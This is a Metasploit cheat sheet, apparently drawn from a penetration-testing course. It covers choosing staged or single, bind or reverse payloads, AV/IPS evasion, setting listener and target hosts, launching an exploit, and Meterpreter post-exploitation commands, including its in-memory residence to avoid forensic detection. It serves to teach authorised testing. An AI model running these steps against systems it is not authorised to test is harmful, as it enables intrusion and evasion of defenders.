1. Exploit buffer size is restricted or AV/IPS evasion is a priority; requires modular delivery of functions.
2. Perimeter firewalls block inbound traffic; requires victim-initiated outbound connections to bypass strict filtering.
3. Target allows direct inbound connections; suitable for bind payloads where the attacker connects to a listening port on the victim.
4. Stability is preferred over modularity and the exploit supports large shellcode; use self-contained Single payloads.
5. Advanced post-exploitation (DLL injection, memory-only residence, hash dumping) is required; use Meterpreter stages.

---

## Payload Architecture Discovery

Target environment requires specific architecture or protocol; narrow down massive lists to relevant modules.

List all available payloads for the current context

```
show payloads
```

Filter payloads by keyword to find specific features like Meterpreter

```
grep meterpreter show payloads
```

Chain filters to isolate specific connection types and handlers

```
grep meterpreter grep reverse_tcp show payloads
```

Identify the number of available modules matching criteria

```
grep -c meterpreter show payloads
```

- Singles (Inline) -> `windows/shell_reverse_tcp` -> Prefer when stability is critical and buffer size is not an issue.
- Staged -> `windows/shell/reverse_tcp` -> Prefer when needing to bypass size limits or modularize attack phases.

## Exploit and Payload Configuration

Exploit module is selected and requires listener and target definitions.

Apply a payload to the active exploit module using its index number

```
set payload <INDEX>
```

Identify required parameters for both the exploit and the selected payload

```
show options
```

Set the listener address for reverse connections

```
set LHOST <ATTACK_IP>
```

Set the target host address

```
set RHOSTS <TARGET_IP>
```

Initiate the attack sequence

```
run
```

- **LPORT in use**: The attack will fail if the local listener port is already bound to another process.
- **Arch Mismatch**: Ensure `VERIFY_ARCH` is set to true to prevent sending incompatible shellcode to the target.

## Meterpreter Post-Exploitation

Successful session established; need to perform file system operations or elevate.

Verify the current user context on the target

```
getuid
```

Spawn a native OS command shell from the session

```
shell
```

List directory contents on the remote system

```
ls
```

Navigate the remote file system

```
cd <FILE_PATH>
```

Display all available Meterpreter commands and loaded plugins

```
help
```

- **whoami** command: This is a Windows native command; it will **fail** in a Meterpreter prompt and should be run within a `shell` channel or replaced with `getuid`.
- **Disk traces**: Standard shell payloads may touch disk; **Meterpreter resides entirely in memory**, making it harder to detect via forensics.

> ⚠️ Gap: The source mentions Windows NX vs. NO-NX stagers but provides no criteria for selecting one over the other based on target memory protections.